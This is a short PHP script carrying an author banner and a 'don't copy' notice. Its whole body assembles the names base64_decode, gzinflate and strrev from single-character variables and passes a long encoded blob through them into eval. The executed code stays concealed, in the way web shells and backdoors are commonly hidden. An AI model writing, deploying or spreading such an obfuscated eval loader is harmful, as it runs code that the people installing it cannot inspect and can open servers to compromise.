<?php																								/***
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Name		  :	Tubagus Sya'banii
Youtube		  :	I'am Tubasya
Instagram	  :	@im.tubasya
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Date              :     2021-10-12 20:15:11 WIB
Ip Address        :     Null
City              :     Tangerang City
Country           :     ID (Indonesian)
Region            :     Banten / East Java
User-Agent        :     Mozilla/5.0 (X11; Linux x86_64; Android 10; ASUS X00TD ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 						***/

/*Please Don't Copy My Script!! ~ By : Iam Tubasya */

/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/* START */ $xh='z';$IQbM='d';$MJnZU='t';$C='l';$Xud='4';$xEdml='6';$Zxfgl='c';$BhIvf='e';$wjIC='s';$AxJZm='_';$lHGhn='b';$jQ='i';$fph='o';$Aa='f';$kG='g';$Z='v';$SDonj='a';$GVpv='r';$SZ='n';$Vicv=$lHGhn.$SDonj.$wjIC.$BhIvf.$xEdml.$Xud.$AxJZm.$IQbM.$BhIvf.$Zxfgl.$fph.$IQbM.$BhIvf;$Ib=$kG.$xh.$jQ.$SZ.$Aa.$C.$SDonj.$MJnZU.$BhIvf;$QPHei=$wjIC.$MJnZU.$GVpv.$GVpv.$BhIvf.$Z;eval($Ib($QPHei($Vicv('A/8D7+0zXIUrasZIz3k1YMB9yNuf+2mb2kf/vowxwoQSmad2WaVNgEfeOn/fz183+NWgS/heatiGgVrRt1+MjtseqKihtvt4l5ZOFfYSBYcOeoF0YWURmjTLSi6HoTrMvJVSEci34Rq/3obvPLKqWo2QYsB35lvgIwGuNevxux+KFS5ptRYxBfm2pJ9CfbmpNM7UQFXotpmssqAwFZYyea2E52aQqTnVBoJKb8Fga1y7kHtaOYMyqhFVluQW00PNRWoHvpWKlLRibO6XYHL8liU4a5+4nl4ZFkrm44Zlk4gzuOSccXuNZL0KtbC9ihO2aLR35dW+Z8Aync5wITH/K0FHeRjMo16nh9Aj+Jn8+lH+5B8TufydjRLcYc68c2JZS2TT40927j9ewzpiATiVvBKE3o7FISZUShC25BT9MVD/dEXwRvcHFHQPN6w0xddn12dHXXLBtzCYX1p2yImkDDJ1g6wbhaAioLLMu4PVCokBIeAUWzW/h9h3eUdQdRgZ1MDZbqA+QTe+KE06JTLXoYMSyLzFmqDAiecGb8WcGbzK6EFhIUhFyzfYI2bVz7Om74lkh4ab3FwO7ipd/8wXlsGsoGm3AQgHdqbgBWZfYB9h2oUljN67ZD2oeC3xXO8Ie3O99caRdMlfyuBeR189GO2a98ymQlR7MU4yQXAcYVsFQd8rlSUqwxZjOKDytbhWTsrmqGhYzKwQic0RfApGDM/SPeBaVWoJxwh2ufWX1zfQu79D5cXD189Rfmv+vqSHLpL5uX16Z+eNE0dr7cpBZeSoy3BIo41WtyyuRjG7AT7Gm7f2ysBp4ccB5NPAef37aeY0dBVmUgttlMpQhWu1XfNElkN0MFwXLmj6dOw4/bv2HGGGTosFlrlmjHkrox3oYr4JAMf519XD/yIb2FG9Bo24HxbN/YJSqaMenuozqvn2aCTsJ2FGinktUy00Ex6svI/8jGEGiQQuG5c8dpWMk26YZUC5mvBE2qYxXjlly1GSyyZvIBeFlSEnKWCs1FI0PFEx2NJXeR8nk1omFEoRVaP6uVE5/t5NQznRo5c4eUGVAptBx2yh36/iclJDIlMYlopoDZu2BYtJtF1t00k44ay1ie+SWQBRFwQgr999EDjbbttUjQ=='))));
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
?>
